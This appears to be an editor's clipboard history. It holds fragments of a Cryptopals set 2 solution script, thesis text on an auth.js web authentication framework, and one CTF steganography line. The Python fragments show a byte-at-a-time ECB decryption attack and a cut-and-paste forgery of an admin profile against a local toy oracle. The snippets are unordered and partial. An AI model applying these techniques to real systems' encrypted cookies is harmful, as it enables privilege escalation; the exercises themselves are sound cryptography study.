c9ad691e55d73b5e0169e4a25158c781|file:///home/neo/cryptopals/set2/set2_sol.py|132|4|V|python
	    decrypted_cipher_blocks = [False] * total_blocks
f911f142ad4190cfbb6fbf33b7c73d5d|file:///home/neo/cryptopals/set2/set2_sol.py|133|12|v|python
	done in enumerate(decrypted_cipher_blocks):
d979aab9e27d0ede0f65a9524b4b9c21|file:///home/neo/cryptopals/set2/set2_sol.py|137|25|V|python
	            print(target)
	            print(len(target))
96ae6416e9967916f7449f07742413fc|file:///home/neo/cryptopals/set2/set2_sol.py|137|1|V|python
	            plaintext = b'A' * (block_size - 1 - i) + decrypted_block
35e38abefdd907d81fa9a20fa2f924bf|file:///home/neo/cryptopals/set2/set2_sol.py|138|22|v|python
	ecb_oracle(plaintext, key)[curr_block*block_size:curr_block*block_size+block_size]
3b1a2c8b045ad3b37150785660d4fcc1|file:///home/neo/cryptopals/set2/set2_sol.py|134|1|V|python
	    for curr_block in range(total_blocks):
f3d7f9027fc71aa51a53f0aecc4e5fbf|file:///home/neo/cryptopals/set2/set2_sol.py|135|29|v|python
	total_blocks
4cb55e16c9d07bb706bdc1d8506e32bc|file:///home/neo/cryptopals/set2/set2_sol.py|144|17|V|python
	                print(c)
b5d281f324914bd9ccdb57152cac5344|file:///home/neo/cryptopals/set2/set2_sol.py|137|1|V|python
	        # for i in range(block_size):
471827d86551eb9b51f054d563c85636|file:///home/neo/cryptopals/set2/set2_sol.py|138|24|v|python
	block_size
cc35caf6ebbae30380e9ca0f8f3dd3a0|file:///home/neo/cryptopals/set2/set2_sol.py|142|13|V|python
	            print(target)
6c82e3e2963fa71c090baf967cdf9895|file:///home/neo/cryptopals/set2/set2_sol.py|153|21|V|python
	                    break
3a8d4fa226bdd99d715eb7247bd01a56|file:///home/neo/cryptopals/set2/set2_sol.py|150|13|V|python
	                    print(target)
245103cf993b448ffb60245f65dc2114|file:///home/neo/cryptopals/set2/set2_sol.py|150|21|V|python
	                    print(c)
	                    print(cipher_block)
2fce063ab0626fe2e86e2a45d4de33be|file:///home/neo/cryptopals/set2/set2_sol.py|138|9|V|python
	        for i in range(2):
0b24de41972535ef22b0f64291b7c793|file:///home/neo/cryptopals/set2/set2_sol.py|135|5|V|python
	    for curr_block in range(1):
a654a2a979d2d407d4e0d2ccb77e891d|file:///home/neo/cryptopals/set2/set2_sol.py|135|9|V|python
	        decrypted_block = b''
0d4d696ff54fc497f27128a4018c9cd0|file:///home/neo/cryptopals/set2/set2_sol.py|146|13|V|python
	                print(c)
	                print(cipher_block)
3b56688cb6ae9f566df3462276d639ec|file:///home/neo/cryptopals/set2/set2_sol.py|136|13|V|python
	            decrypted_block = b''
288dd99efce111763943a43dfe5070e0|file:///home/neo/cryptopals/set2/set2_sol.py|138|53|v|python
	decrypted_block
f6995617858444aa0f20ce7e0b256772|file:///home/neo/cryptopals/set2/set2_sol.py|154|13|V|python
	            print(decrypted_block)
3e141e233d20f5d5a544e473342088c6|file:///home/neo/cryptopals/set2/set2_sol.py|138|70|v|python
	+ decrypted_block
7d9d4a8de7625beee97ae47f6adab6e7|file:///home/neo/cryptopals/set2/set2_sol.py|138|25|v|python
	curr_block
ed0b3494ff645252e2ceff4d2f5dea9c|file:///home/neo/cryptopals/set2/set2_sol.py|140|1|V|python
	            target = ecb_oracle(plaintext, key)[curr_block*block_size:curr_block*block_size+block_size]
0bea9314e2e943921647c32e96b8fbbc|file:///home/neo/cryptopals/set2/set2_sol.py|146|1|V|python
	                cipher_dict[c] = ecb_oracle(plaintext, key)[curr_block*block_size:curr_block*block_size+block_size]
7d558ea0b968c7ec3ddb4d508e9472e8|file:///home/neo/cryptopals/set2/set2_sol.py|138|24|V|python
	            plaintext = total_blocks * block_size * b'A' + b'A' * (block_size - 1 - i) 
	            # print(plaintext)
a71156a43eeebec0e72bb744644340bc|file:///home/neo/cryptopals/set2/set2_sol.py|135|9|V|python
	        print(curr_block)
426478c89bb3ac48d202550a1ac5718d|file:///home/neo/cryptopals/set2/set2_sol.py|136|27|V|python
	        plaintext = total_blocks * block_size * b'A' + b'A' * (block_size - 1) 
	        print(plaintext)
eeee73931fa40c77e0733f3b438ac435|file:///home/neo/cryptopals/set2/set2_sol.py|156|13|V|python
	            print(plaintext)
9df3950c3a9388d901eaad0d362f7eeb|file:///home/neo/cryptopals/set2/set2_sol.py|142|25|v|python
	total_blocks*block_size:total_blocks*block_size+block_size
245b21cd8bd07dd62a71be5d6f222d6f|file:///home/neo/cryptopals/set2/set2_sol.py|141|13|V|python
	            print(ct)
4b8362e8a29211938d2acb5891885077|file:///home/neo/cryptopals/set2/set2_sol.py|141|13|V|python
	            target = ct[-block_size:]
5aee547ec884d160ee2170a9d080a771|file:///home/neo/cryptopals/set2/set2_sol.py|145|1|V|python
	                if curr_block == 0 and i==0 and c == 'R':
	                    print(target)
	                    print(plaintext_pad)
f160ffd627035064008998273e97c9b0|file:///home/neo/cryptopals/set2/set2_sol.py|141|49|v|python
	block_pos_len:block_pos_len + 16
64d017664f7b83367587ecd5e0f631c3|file:///home/neo/cryptopals/set2/set2_sol.py|145|17|V|python
	                # cipher_dict[c] = ecb_oracle(plaintext, key)[curr_block*block_size:curr_block*block_size+block_size]
ea940e095b64c7270aa122ad4b7ba1aa|file:///home/neo/cryptopals/set2/set2_sol.py|140|13|V|python
	            # target = ecb_oracle(plaintext, key)[curr_block*block_size:curr_block*block_size+block_size]
eb7192866b6a3935f316ca000e4ec9da|file:///home/neo/cryptopals/set2/set2_sol.py|145|17|V|python
	                if curr_block == 0 and i==0 and c == 'R':
082bfa1bb75f296079aa7845ebbc9aed|file:///home/neo/cryptopals/set2/set2_sol.py|140|1|V|python
	            target = ecb_oracle(plaintext, key)[block_pos_len:block_pos_len + 16]
ca95d4d3b2a9faa6d52e4a89a8d2c6af|file:///home/neo/cryptopals/set2/set2_sol.py|141|49|v|python
	block_pos_len
9c610c579b901b7b0170447570ac51ee|file:///home/neo/cryptopals/set2/set2_sol.py|147|1|V|python
	                cipher_dict[c] = ecb_oracle(plaintext_pad, key)[block_pos_len:block_pos_len + 16]
f20131c8df82d251ef633657ea43b0f1|file:///home/neo/cryptopals/set2/set2_sol.py|143|49|v|python
	(total_blocks-1) * block_size:(total_blocks-1) + 16
9d3dd752baea9d26f5276a0e2e69e278|file:///home/neo/cryptopals/set2/set2_sol.py|147|1|V|python
	                # cipher_dict[c] = ecb_oracle(plaintext_pad, key)[block_pos_len:block_pos_len + 16]
14b61db1d7a5d901194c305d8de0025b|file:///home/neo/cryptopals/set2/set2_sol.py|146|1|V|python
	                plaintext_pad = block_pos_len * b'A' + b'A' * (block_size - 1 - i) + decrypted_block + bytes(c, 'utf-8')
d29a2b6e3a77216f0256d1aea25ceb84|file:///home/neo/cryptopals/set2/set2_sol.py|150|64|v|python
	[block_pos_len:block_pos_len + 16]
c81858101b134a23eb7a0df15e102f4d|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|4|18|v|tex
	proposals
e886b5e8a9e6a8b1a306ac1efb18ec84|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|7|18|v|tex
	them
641cb5d0edcd12ff789a76a789b47d71|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|7|217|v|tex
	primarily
b702dbe5591cd44ed251a6425ae122a4|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|4|18|v|tex
	ideas
f615bec73d320487bf0f8e00dfb10c72|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|3|1|V|tex
	Several research ideas have been proposed for authentication based on more elaborate schemes than simply storing hashed passwords, such as PAKE-based protocols.
038703c7230ae012e3c783ace1d09d64|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|3|207|v|tex
	works
e90869220bd6e85857a5850f12ccd441|file:///home/neo/cryptopals/set2/set2_sol.py|150|17|V|python
	                # cipher_dict[c] = ecb_oracle(plaintext_pad, key)
0591a6f152796a84b90a5b28561d8d6a|file:///home/neo/cryptopals/set2/set2_sol.py|147|17|V|python
	                # plaintext_pad = b'A' * (block_size - 1 - i) + decrypted_block + bytes(c, 'utf-8')
bacccb67f075dfd3c9b764b4f15ec00b|file:///home/neo/cryptopals/set2/set2_sol.py|142|13|V|python
	            # target = ecb_oracle(plaintext, key)[block_pos_len:block_pos_len + 16]
f4d064415dab121ab39d176d95b41592|file:///home/neo/cryptopals/set2/set2_sol.py|139|9|V|python
	        print(block_pos_len)
5c79d792b12f7d275a5bd5f51b300687|file:///home/neo/cryptopals/set2/set2_sol.py|139|9|V|python
	        print((total_blocks-1) * block_size)
7761eb09b5f321db0f96d89d7e6dc160|file:///home/neo/cryptopals/set2/set2_sol.py|145|9|V|python
	                if i==0 and c == 'R':
	                    print(target)
	                    print(plaintext_pad)
f933e3bdf46d22dd3c13f3833566def6|file:///home/neo/cryptopals/set2/set2_sol.py|147|13|V|python
	                    # print(c)
	                    # print(cipher_block)
	                    # print(target)
f20037db346774bf65cd9c428a94b281|file:///home/neo/cryptopals/set2/set2_sol.py|90|37|v|python
	Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkgaGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBqdXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUgYnkK
6a409434e9d0edca84b638b139dca24c|file:///home/neo/cryptopals/set2/set2_sol.py|151|9|V|python
	        print(decrypted_text)
8160d1de344435946b5f02ef9c3f1eb1|file:///home/neo/cryptopals/set2/set2_sol.py|126|5|V|python
	    plaintext = b'A' * 50
650540b932d094af4289c06ab9b10191|file:///home/neo/cryptopals/set2/set2_sol.py|144|1|V|python
	                cipher_dict[c] = ecb_oracle(plaintext_pad, key)[(total_blocks-1) * block_size:(total_blocks-1) * block_size + 16]
b144b8417f513b015f274991c1ac02a1|file:///home/neo/cryptopals/set2/set2_sol.py|145|17|v|python
	cipher_dict[c] 
a5e2254ec78b6819d44d882c6302b495|file:///home/neo/cryptopals/set2/set2_sol.py|149|1|V|python
	                    decrypted_block += bytes(c, 'utf-8')
994f94a9c7f974db4738859de1fe6b5a|file:///home/neo/cryptopals/set2/set2_sol.py|149|1|V|python
	            # for c, cipher_block in cipher_dict.items():
	            #     if target == cipher_block:
	            #         decrypted_block += bytes(c, 'utf-8')
	            #         break
e963795f4e1a44cf8f0d8475c80a9e5f|file:///home/neo/cryptopals/set2/set2_sol.py|144|13|V|python
	                # cipher_dict[c] = ecb_oracle(plaintext_pad, key)[(total_blocks-1) * block_size:(total_blocks-1) * block_size + 16]
aeed718d6b911c12a1128da3fc2d5548|file:///home/neo/cryptopals/set2/set2_sol.py|141|13|V|python
	            # cipher_dict = {}
4a6ea5c2a7c42f0f71f0eab320c07f17|file:///home/neo/cryptopals/set2/set2_sol.py|141|58|v|python
	(total_blocks-1) * block_size
a7e0ed84eea03d7c6306c1d72b1af5d0|file:///home/neo/cryptopals/set2/set2_sol.py|141|74|v|python
	(total_blocks-1) * block_size 
bd6b9e5fa40dfffe17822cddbe04a25a|file:///home/neo/cryptopals/set2/set2_sol.py|143|33|v|python
	block_position
6ddf52e7c53c8c3d77911a8236711a57|file:///home/neo/cryptopals/set2/set2_sol.py|139|9|V|python
	        # block_position = (total_blocks - curr_block - 1) * block_size
49c4d4f58837bb8d9806c39821c2f0c2|file:///home/neo/CTFs/x-masctf/asciistego/chall.txt|88|1|V|text
	 abaaabaabaaabaaaab bbbbbbbbbbbbbaaaaaaaa bbbbbbbbbbbbbbbbbbbbabbbabbabbbbbbbbbbbb bbbbbbbbbbbaaaaaaaaaaa   bbbbbbbbbbbbabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb bbabaabababaabbabaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbabb abababaabaaabbabaabba aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbb bbbbbbbbbbbaaaaaaaaaaa bbbbbbbbbbbbbbbbbaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbabbbbbbbbbbbbbbb bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbba bbbbbbbabbbabbabbbabbbbbabbb bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbba 
7143539c49165c320d5c366d18418d62|file:///home/neo/CTFs/x-masctf/asciistego/chall.txt|88|2|v|text
	abaaabaabaaabaaaab
5891da2d64975cae48d175d1e001f5da|file:///home/neo/cryptopals/set2/set2_sol.py|156|5|v|python
	objects
b4c4cec1dd628f8c41717dbc25ad5541|file:///home/neo/cryptopals/set2/set2_sol.py|157|5|V|python
	    print(objects)
0f76535d1cf96d98b4c0fefe9216d7da|file:///home/neo/cryptopals/set2/set2_sol.py|155|17|v|python
	str(query)
46e13de39e1d66447fc14a013d837b37|file:///home/neo/cryptopals/set2/set2_sol.py|157|5|V|python
	    print(params)
eaaff1a982a292d2dbdbed79414d4487|file:///home/neo/cryptopals/set2/set2_sol.py|161|5|V|python
	    print(data)
515d70e79334fbd7048763ee2e15455a|file:///home/neo/cryptopals/set2/set2_sol.py|173|5|V|python
	    print(encoded)
a94335b843805fa42dbfe74e200fdcdf|file:///home/neo/cryptopals/set2/set2_sol.py|181|5|V|python
	    print(profile.decode('utf-8'))
ba3e451b3357d564fc213258e0deb669|file:///home/neo/cryptopals/set2/set2_sol.py|178|1|V|python
	    if not isinstance(profile, bytes) or not isinstance (key, bytes):
	        raise TypeError
10a260467386ce0a72ed94b7e8114e59|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|53|8|v|tex
	eliasathan@cs.ucy.ac.cy
00ab7ac66b0d8a6bb2676b163b4fab88|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|20|^v|tex
	auth.js:} Advanced Authentication for the Web 
ad6ca3abd375041b61e797153b0edc17|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|3|1|V|tex
	Several research works attempt to replace simple authentication schemes, where
	the cryptographic digest of a plaintext password is stored at the server. Those
	proposals are based on more elaborate schemes, such as PAKE-based protocols.
	However, in practice, only a very limited amount of applications in the web use
	such schemes. The reason for this limited deployment is perhaps 
	their complexity as far as the cryptography involved is concerned.
	Today, even the most successful web applications use text-based
	passwords, which are simply hashed and stored at the server. This has broad implications
	for both the service and the user. Essentially, the users are forced to reveal
	their plain passwords for both registering and authenticating with a service.
	
	In this paper, we attempt to make it easier for any web service to a) enable
	easily advanced authentication schemes, and b) switch from one scheme to
	another.  More precisely, we design and realize {\tt auth.js}, a framework that
	allows a web application to offer advanced authentication that leverages
	sophisticated techniques compared to typical cryptographically hashed
	text-based passwords. In fact, {\tt auth.js} can be easily enabled in all web
	applications and supports traditional passwords -- however, once enabled,
	switching to a more elaborate scheme is straight forward. {\tt auth.js}
	leverages advanced cryptographic primitives, which can be used for implementing
	strong authentication, such as PAKE and similar solutions, by ensuring that all
	cryptographic primitives are trusted and executed using the browser's engine. For
	this, we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve. Finally, we evaluate {\tt auth.js}
	with real web applications, such as WordPress.
	
18d44d5fbf21b8c4ca3ee28d4e8fa529|file:///home/neo/cryptopals/set2/set2_sol.py|183|1|V|python
	    if not isinstance(enc_profile, bytes) or not isinstance (key, bytes):
	        raise TypeError
5d738dddec1299fbf5392562c32e8a06|file:///home/neo/cryptopals/set2/set2_sol.py|189|12|^v|python
	isinstance(enc_profile, bytes) or not 
3230f33e8760b14724f434bc2a92e11b|file:///home/neo/cryptopals/set2/set2_sol.py|198|12|v|python
	ed_prof = encrypt_profile(profile, key)
8d1a13b5b9877257bb78f67f8ff31c5b|file:///home/neo/cryptopals/set2/set2_sol.py|198|1|V|python
	    encrypt
	    print(encrypted_prof)
	    decrypted_prof = decrypt_profile(encrypted_prof, key)
	    print(decrypted_prof)
29861ce1a149f38e66c7a2570feb9514|file:///home/neo/cryptopals/set2/set2_sol.py|198|5|V|python
	    # encoded = encode_cookie(b'foo=bar&baz=qux&zap=zazzle')
23e53dc769412124f63b81d1b370d22e|file:///home/neo/cryptopals/set2/set2_sol.py|198|5|V|python
	    profile = profile_for(b'foo@bar.com.role.admin')
099e0d48e25c7c14ba1f01776a14a838|file:///home/neo/cryptopals/set2/set2_sol.py|130|1|V|python
	    mode = detect_mode(bytes(ciphertext, 'utf-8'))
	    if mode != 'ECB':
	        raise Exception('Can only decrypt ECB mode')
fd2b3717657cacd53adea1b6854f13bc|file:///home/neo/cryptopals/set2/set2_sol.py|127|1|V|python
	    block_size = detect_block_size(key)
	    ciphertext = ecb_oracle(b'A' * 50, key)
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    mode = detect_mode(bytes(ciphertext, 'utf-8'))
	    if mode != 'ECB':
	        raise Exception('Can only decrypt ECB mode')
57a0cb72430dc108f13d86bb31ecdbea|file:///home/neo/cryptopals/set2/set2_sol.py|192|5|V|python
	    ciphertext = ecb_oracle(b'A' * 50, key)
3da7bd9ec3108686551860556a72328b|file:///home/neo/cryptopals/set2/set2_sol.py|192|5|V|python
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
b56f88f302c60e4b98f40ba215dc4366|file:///home/neo/cryptopals/set2/set2_sol.py|192|5|V|python
	    mode = detect_mode(bytes(ciphertext, 'utf-8'))
05b36e2665b3f9827fccb96df8f16fe2|file:///home/neo/cryptopals/set2/set2_sol.py|106|18|v|python
	ecb_oracle
8d86f2fc278c6d8ff195b8cb6136208f|file:///home/neo/cryptopals/set2/set2_sol.py|106|1|V|python
	    # ciphertext = ecb_oracle(plaintext, key)
f6a2424dc23bd2344528ab2b415b175c|file:///home/neo/cryptopals/set2/set2_sol.py|194|20|V|python
	    if mode != 'ECB':
	        raise Exception('Can only decrypt ECB mode')
7a0cc2c9fb4a410cbc82aedae2f986ca|file:///home/neo/cryptopals/set2/set2_sol.py|111|36|V|python
	        cipher_len = len(ciphertext)
	        print(prev_cipher_len)
c419c789e9c71087ef94cfbe4de2c89d|file:///home/neo/cryptopals/set2/set2_sol.py|112|30|V|python
	        print(prev_cipher_len)
	        print(cipher_len)
13f07d3ba5a6dcdd5e14d1b1c313969e|file:///home/neo/cryptopals/set2/set2_sol.py|207|37|V|python
	    # key = generate_random_bytes(16)
	    # decrypted = ecb_decrypt_byte_at_a_time(key, ecb_oracle)
	    # print(decrypted.decode('utf-8'))
22f85e523cb1bf52e6cf53566ea0129f|file:///home/neo/cryptopals/set2/set2_sol.py|193|5|V|python
	    print(block_size)
177e8c917a53d14236375f1337cece08|file:///home/neo/cryptopals/set2/set2_sol.py|201|5|V|python
	    email_suffix = b'@test.com'
86e1d425020e9d9fa5938395329f3914|file:///home/neo/cryptopals/set2/set2_sol.py|194|5|V|python
	    profile = profile_for(b'test@test.com.role.admin')
7e8d3736570ad52dd2f6b648a657cbad|file:///home/neo/cryptopals/set2/set2_sol.py|195|27|v|python
	b'test@test.com.role.admin'
a9c6074f698b67ed16da601a363c110e|file:///home/neo/cryptopals/set2/set2_sol.py|197|1|V|python
	    print(prev_cipher_len)
02b4deea2142532519faae6db3da1ff6|file:///home/neo/cryptopals/set2/set2_sol.py|197|5|V|python
	    print(prev_ciphertext_len)
0f3c75710de577628fa15fbf32695c48|file:///home/neo/cryptopals/set2/set2_sol.py|197|5|V|python
	    print(ciphertext_len)
aa81b161761300bca8f4a45b04650204|file:///home/neo/cryptopals/set2/set2_sol.py|194|1|V|python
	    email_prefix = b'a'
	    profile = profile_for(email_prefix + email_suffix)
10f93ade45a57ca0b96f876b4c473250|file:///home/neo/cryptopals/set2/set2_sol.py|196|1|V|python
	    prev_ciphertext_len = ciphertext_len = len(encrypt_profile(profile, key))
b909503b08937430ccd86e752a0d6e04|file:///home/neo/cryptopals/set2/set2_sol.py|201|1|V|python
	        print(ciphertext_len)
cfb9a72a1441d2461d19ddc31af6ea2b|file:///home/neo/cryptopals/set2/set2_sol.py|201|9|V|python
	        print(prev_ciphertext_len)
cbb47447d3c32e9f9759139eec4a98d4|file:///home/neo/cryptopals/set2/set2_sol.py|163|5|V|python
	    json_data = json.dumps(data)
39a4e57a61776d7322e4c3fb0dbf2f91|file:///home/neo/cryptopals/set2/set2_sol.py|5|1|V|python
	import json
a2ee189846b52af39c8d6707472bf8d6|file:///home/neo/cryptopals/set2/set2_sol.py|162|12|v|python
	bytes(json_data, 'utf-8')
1c9af04f30e9b7f01516f594219a6df0|file:///home/neo/cryptopals/set2/set2_sol.py|208|30|v|python
	test@test.comrole=admin
f337eb50d1ce7b43cf0c72869ad6ce32|file:///home/neo/cryptopals/set2/set2_sol.py|185|18|v|python
	decr[:decr.rfind('}') + 1]
095ed287a9278778fa1b05d8a39640a2|file:///home/neo/cryptopals/set2/set2_sol.py|186|12|v|python
	bytes(, 'utf-8')
a6c5855e10a0b73f3d40c6487ae1b405|file:///home/neo/cryptopals/set2/set2_sol.py|209|5|V|python
	    cookie = encode_cookie(b'foo=bar&baz=qux&zap=zazzle')
2204f84047c250a3e340092feab49b8d|file:///home/neo/cryptopals/set2/set2_sol.py|209|5|V|python
	    print(cookie)
134b9ea984c5258e44b2160fbb3495ab|file:///home/neo/cryptopals/set2/set2_sol.py|211|5|V|python
	    # key = generate_random_bytes(16)
f0cf05138ad3dafad015eff6b9f2947c|file:///home/neo/cryptopals/set2/set2_sol.py|211|5|V|python
	    print(enc_profile)
dcf8a8743ffc9073b7ff47bb677b3a8f|file:///home/neo/cryptopals/set2/set2_sol.py|210|5|V|python
	    print(profile)
56617619503434044a088b0eac436677|file:///home/neo/cryptopals/set2/set2_sol.py|173|35|v|python
	uid=10&role=user&email=" + email
968de8b0c7fd9765a627a0f406db3e96|file:///home/neo/cryptopals/set2/set2_sol.py|173|5|V|python
	    profile_obj = encode_cookie(b")
3b18b1d012c4813861a2d9ba7d97a89b|file:///home/neo/cryptopals/set2/set2_sol.py|214|43|V|python
	    # admin_acc = create_admin_account(key)
	    # admin_acc_decrypted = decrypt_profile(admin_acc, key)
	    # print(admin_acc_decrypted.decode('utf-8'))
a12f3a25053f885437a417251779a1f1|file:///home/neo/cryptopals/set2/set2_sol.py|185|5|V|python
	    decr = decr[:decr.rfind('}') + 1]
3b16bda0567ec072524564072cb5cc5d|file:///home/neo/cryptopals/set2/set2_sol.py|185|11|v|python
	decr
3edf0a2bb7b7ccbb730aeab3e9f1590d|file:///home/neo/cryptopals/set2/set2_sol.py|185|5|V|python
	    print("Pad:" ,pad)
150fcac155bbf72b40d72006410843b4|file:///home/neo/cryptopals/set2/set2_sol.py|204|5|V|python
	    encrypted_admin = encrypt_profile(profile, key)
b5fb9eea517ab0767e705efbf1240c3f|file:///home/neo/cryptopals/set2/set2_sol.py|204|5|V|python
	    return encrypted_admin
d9575d53f1745a737aad0f41e408dce6|file:///home/neo/cryptopals/set2/set2_sol.py|203|5|V|python
	    encrypted_profile = encrypt
0e8f83fec00190ac0cb4cf51b4cc37fd|file:///home/neo/cryptopals/set2/set2_sol.py|192|1|V|python
	    if not isinstance (key, bytes):
	        raise TypeError
	    block_size = detect_block_size(key, encrypt_profile)
4ca3912b74ea359993a3e7f74a375fa2|file:///home/neo/cryptopals/set2/set2_sol.py|192|5|V|python
	    block_size = detect_block_size(key, encrypt_profile)
394b7ab765998af26da6e35a50b61b02|file:///home/neo/cryptopals/set2/set2_sol.py|200|1|V|python
	    profile = profile_for(email_prefix + email_suffix)
	    prev_ciphertext_len = ciphertext_len = len(encrypt_profile(profile, key))
	    while prev_ciphertext_len == ciphertext_len:
	        email_prefix += b'a'
	        profile = profile_for(email_prefix + email_suffix)
	        prev_ciphertext_len = ciphertext_len 
	        ciphertext_len = len(encrypt_profile(profile, key))
751c90f6854fa14bea3bb83ab60602b1|file:///home/neo/cryptopals/set2/set2_sol.py|208|5|V|python
	    print(email_prefix)
f5fb8ad1416fcab65e08ef5c44937ff9|file:///home/neo/cryptopals/set2/set2_sol.py|208|5|V|python
	    print(find_new_block_offset(email_prefix, email))
45ede18c6dd57f1b830cb77d2d568460|file:///home/neo/cryptopals/set2/set2_sol.py|189|5|V|python
	def find_new_block_offset(email_prefix: bytes, email_suffix: bytes, key:bytes):
	    if not isinstance(email_prefix, bytes) or not isinstance(email_suffix, bytes) or not isinstance (key, bytes):
	        raise TypeError
	    block_size = detect_block_size(key, encrypt_profile)
58f219d835ef744929e9129ecec158c5|file:///home/neo/cryptopals/set2/set2_sol.py|203|5|V|python
	    print(len(email_prefix))
a4456adab569fb398f8ff2ff68263949|file:///home/neo/cryptopals/set2/set2_sol.py|200|43|v|python
	 + email_suffix
f567a8494b3bcafa503c4c071e51c97b|file:///home/neo/cryptopals/set2/set2_sol.py|195|5|V|python
	    print(len(target_bytes+email_suffix))
2e5f912ed64105b80b40ffa9c45695be|file:///home/neo/cryptopals/set2/set2_sol.py|207|44|v|python
	.decode('utf-8')[-block_size:]
7243b7c483350ec21d030340bdf92839|file:///home/neo/cryptopals/set2/set2_sol.py|206|51|v|python
	[:-block_size]
4f7e8039989b781c78918b1f563bed5a|file:///home/neo/cryptopals/set2/set2_sol.py|207|1|V|python
	    print(enc_att)
9e917509ca94407bdd30505bfe580b99|file:///home/neo/cryptopals/set2/set2_sol.py|207|18|V|python
	    print(enc_att)
	    print(enc_att[-block_size:])
f94dc5246ed5a150329dfdccb1d1a662|file:///home/neo/cryptopals/set2/set2_sol.py|207|5|V|python
	    print(attack_profile)
98549df38092f22c8b7298388cb959a4|file:///home/neo/cryptopals/set2/set2_sol.py|209|5|V|python
	    print(de)
e8dfa7bf68a7a1ea36304b025e29eb16|file:///home/neo/cryptopals/set2/set2_sol.py|205|1|V|python
	    email_prefix = email_prefix[:-len(email_suffix+target_bytes)]
cba5401088cea591e01ede2e1779f83f|file:///home/neo/cryptopals/set2/set2_sol.py|206|35|v|python
	len(email_suffix+target_bytes)
16aec1f7bd78eabad7b3b396cc667f64|file:///home/neo/cryptopals/set2/set2_sol.py|211|4|V|python
	    print(len(attack_profile) % block_size)
73f4c0eb685038954f30b35e64130ae2|file:///home/neo/cryptopals/set2/set2_sol.py|196|1|V|python
	    profile = profile_for(email_prefix + email_suffix)
10e94303909017a20dd0175ddebacd41|file:///home/neo/cryptopals/set2/set2_sol.py|203|1|V|python
	    # while prev_ciphertext_len == ciphertext_len:
	    #     email_prefix += b'a'
	    #     profile = profile_for(email_prefix)
	    #     prev_ciphertext_len = ciphertext_len 
	    #     ciphertext_len = len(encrypt_profile(profile, key))
	    # if len(email_prefix) < 16:
	    #     email_prefix += b'a' * 16
	    # email_prefix = email_prefix[:-len(email_suffix+target_bytes)]
884d571357a5be6f8d2e4f2a7b194d8f|file:///home/neo/cryptopals/set2/set2_sol.py|203|5|V|python
	    email_prefix = email_prefix[:-1]
00cee5d4569ce397811161ff60d5574d|file:///home/neo/cryptopals/set2/set2_sol.py|200|5|V|python
	    print(len(profile))
	    print(len(profile) % block_size)
04dbbf7e89f53fce6533a6d9826e2b64|file:///home/neo/cryptopals/set2/set2_sol.py|199|5|V|python
	    attack_profile = profile_for(email_prefix + email_suffix)
fa0effe59133d8412310a22c99e26969|file:///home/neo/cryptopals/set2/set2_sol.py|200|5|V|python
	    # print(decrypt_aes_ecb(enc_att, key))
a800ac7b49b56742d6c99eaf57c44e57|file:///home/neo/cryptopals/set2/set2_sol.py|203|5|V|python
	    print(dec)
96cd6dc65d7df9ee5257c802f28e0f6c|file:///home/neo/cryptopals/set2/set2_sol.py|202|5|V|python
	    dec = decrypt_aes_ecb(enc_att, key)
b1c79b3e216ffcf74d12b7b8cf34f5ac|file:///home/neo/cryptopals/set2/set2_sol.py|203|5|V|python
	    print(dec_att)
df937e22aa237bd70db7bc63075c6ea2|file:///home/neo/cryptopals/set2/set2_sol.py|202|5|V|python
	    dec_att = decrypt_profile(encrypted_fake_profile, key)
11b3c633b633d7f6dba4c6db059b0489|file:///home/neo/cryptopals/set2/set2_sol.py|208|5|V|python
	    # admin_acc_decrypted = decrypt_profile(admin_acc, key)
a4a845176daf0b5b0259e3505d734925|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|189|v|tex
	again 
6feac2d9e4755ff1afb998b3cbb6ad7f|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|3|47|v|tex
	{\tt auth.js} architecture, as
a6dbbee203e312191622912eaba30105|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|3|47|^v|tex
	{\tt auth.js}
f62eba620fb630f5c09ea8a0dcbe41e9|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|11|1|V|tex
	enforces the client's browser to perform authentication using two different
	authentication schemes: (a) a typical one based on hashing text-based
	passwords, and (b) a more advanced one based on public-key cryptography. 
c0444b39375cfb80e78967f7c5185476|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|41|9|V|tex
	        They take as arguments the user's username and password and the address of the server and handle the corresponding actions, using the previously defined authentication scheme.
51ea6d44474566a990e7c81a72f87f60|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|66|1|V|tex
	
	\begin{lstlisting}[caption={\textbf{Web application html file.} The client is directed to get {\tt auth.js} from a truted source.}, label={lst:html}]
	<html>
	<head>
	...
